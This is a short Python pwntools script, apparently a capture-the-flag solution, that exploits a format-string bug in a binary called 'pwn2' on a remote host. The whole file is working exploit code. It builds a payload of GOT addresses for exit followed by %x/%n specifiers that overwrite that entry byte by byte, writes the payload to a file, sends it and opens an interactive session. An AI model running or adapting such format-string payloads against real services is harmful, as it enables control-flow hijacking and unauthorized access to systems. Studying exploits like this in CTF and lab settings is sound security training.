#!/usr/bin/env python

from pwn import *

myelf = ELF("pwn2")
# sh = process("./pwn2")
sh = remote("www.cyanpencil.xyz", 5001)

e = myelf.got['exit']
mystr = "ddd" + p32(e) + p32(e+1) + p32(e+2) + p32(e+3) + "giiii%190x%7$n%187x%8$n%115x%9$na%3x%10$na"

f = open("input", "wb")
f.write(mystr)
f.close()

sh.sendline(mystr)
sh.interactive()
